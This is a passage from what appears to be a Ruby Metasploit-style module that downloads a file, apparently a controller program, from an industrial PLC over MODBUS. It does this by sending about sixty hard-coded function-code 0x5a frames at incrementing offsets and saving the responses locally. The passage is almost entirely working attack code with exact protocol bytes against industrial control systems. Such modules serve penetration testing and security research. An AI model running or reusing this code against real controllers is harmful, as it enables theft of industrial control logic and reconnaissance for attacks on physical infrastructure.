        response = send_frame(make_frame("\x01\x5a\x00\x28\x74\x86\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x60\x87\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x4c\x88\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x38\x89\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x24\x8a\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x10\x8b\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xfc\x8b\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xe8\x8c\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xd4\x8d\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xc0\x8e\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xac\x8f\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x98\x90\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x84\x91\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x70\x92\x00\x07\x52\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xe0\xef\x00\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xcc\xf0\x00\x07\x4f\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xfc\xd9\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xe8\xda\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xd4\xdb\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xc0\xdc\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xac\xdd\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x98\xde\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x84\xdf\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x70\xe0\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x5c\xe1\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x48\xe2\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x34\xe3\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x20\xe4\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x0c\xe5\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xf8\xe5\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xe4\xe6\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xd0\xe7\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xbc\xe8\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xa8\xe9\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x94\xea\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x80\xeb\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x6c\xec\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x58\xed\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x44\xee\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x30\xef\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x1c\xf0\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x08\xf1\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xf4\xf1\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xe0\xf2\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xcc\xf3\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xb8\xf4\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xa4\xf5\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x90\xf6\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x7c\xf7\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x68\xf8\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x54\xf9\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x40\xfa\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x2c\xfb\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x18\xfc\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x04\xfd\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xf0\xfd\x03\x07\xec\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\xdc\xfe\x03\x07\x8f\x00"))
        filedata += response[0xe..-1]
        response = send_frame(make_frame("\x01\x5a\x00\x28\x6c\xff\x03\x07\x94\x00"))
        filedata += response[0xe..-1]

        print_status("#{rhost}:#{rport} - MODBUS - Closing file '#{datastore['FILENAME']}'")
        file.print filedata
        file.close
      end
      def cleanup
        disconnect rescue nil
      end
    end
